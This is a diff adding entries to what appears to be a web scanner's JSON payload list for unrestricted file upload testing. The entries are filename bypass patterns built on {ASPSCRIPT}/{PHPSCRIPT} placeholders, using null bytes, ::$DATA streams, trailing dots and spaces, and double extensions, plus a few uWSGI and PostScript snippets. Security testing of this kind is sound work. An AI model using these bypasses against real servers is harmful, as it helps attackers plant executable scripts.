@@ -20,5 +20,819 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-244946",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[uwsgi]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244974",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ null restore } stopped { pop } if",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244975",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ legal } stopped { pop } if",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393295",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393296",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}.{EXT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393297",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393298",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.{EXT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393299",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393300",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.{EXT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393301",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393302",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.{EXT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393303",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393304",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.pdf",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393305",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393306",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.htm",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393307",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393308",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.xyz",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393309",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.zip",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393310",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.tgz",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393311",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393312",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.docx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393313",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.xls",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393314",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT};.xlsx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393315",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393316",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.pdf",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393317",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393318",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393319",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.xyz",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393320",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.tgz",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393321",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.zip",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393322",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393323",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00.docx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393324",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393325",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.pdf",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393326",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393327",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393328",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.zip",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393329",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393330",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00.xls",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393331",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393332",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20...%20.%20..",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393333",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00......",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393334",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393335",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20...%20.%20..",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393336",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}......",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393337",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393338",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20...%20.%20..",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393339",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%......",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393340",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393341",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393342",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20...%20.%20..;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393343",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00%20%20%20...%20.%20..;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393344",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00......;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393345",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%00......;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393346",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393347",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393348",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20...%20.%20..;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393349",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}%20%20%20...%20.%20..;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393350",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}......;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393351",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}......;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393352",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393353",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393354",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20...%20.%20..;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393355",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%%20%20%20...%20.%20..;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393356",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%......;.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393357",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{ASPSCRIPT}::data%00%......;.doc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393358",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393359",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}.phtml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393360",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}.php.html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393361",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}.php::$DATA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393362",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}.php.php.rar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393363",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}.php.rar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393364",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{PHPSCRIPT}::$DATA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393404",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[.{EXT}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
